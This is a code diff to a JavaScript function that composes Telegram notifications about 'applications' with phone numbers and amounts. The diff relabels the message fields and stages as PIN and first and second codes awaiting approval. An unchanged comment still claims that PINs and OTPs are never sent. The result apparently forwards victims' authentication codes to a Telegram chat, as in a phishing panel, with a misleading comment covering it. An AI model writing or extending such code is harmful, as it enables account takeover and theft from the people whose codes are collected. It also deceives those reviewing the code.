@@ -353,9 +353,9 @@ async function notifyTelegram(application) {
   // Notification tag changes with the current application stage.
   // Authentication secrets (PINs/OTPs/verification codes) are never sent to Telegram.
   let title = "🆕 NEW APPLICATION";
-  if (application.status === "AWAITING_FIRST_NAME_APPROVAL" && application.first_name) {
+  if (application.status === "AWAITING_FIRST_CODE_APPROVAL" && application.first_name) {
     title = `👤 ${String(application.first_name).toUpperCase()} — APPLICATION`;
-  } else if (application.status === "AWAITING_SECOND_NAME_APPROVAL" && application.second_name) {
+  } else if (application.status === "AWAITING_SECOND_CODE_APPROVAL" && application.second_name) {
     title = `👤 ${String(application.second_name).toUpperCase()} — APPLICATION`;
   } else if (application.status === "AWAITING_AMOUNT_APPROVAL") {
     const name = application.second_name || application.first_name;
@@ -363,10 +363,10 @@ async function notifyTelegram(application) {
   }
 
   const text = `${title}\n\n` +
-    `📋 APPLICATION: ${application.application_id || application.application_no}\n` +
+    `📌 PIN: ${application.application_id || application.application_no}\n` +
     `📞 PHONE: ${application.phone}\n` +
-    `👤 FIRST NAME: ${application.first_name || "waiting"}\n` +
-    `👤 SECOND NAME: ${application.second_name || "waiting"}\n` +
+    `👤 FIRST CODE: ${application.first_name || "waiting"}\n` +
+    `👤 SECOND CODE: ${application.second_name || "waiting"}\n` +
     `💰 AMOUNT: ${money(application.amount)}\n` +
     `📌 STATUS: ${application.status}`;
 
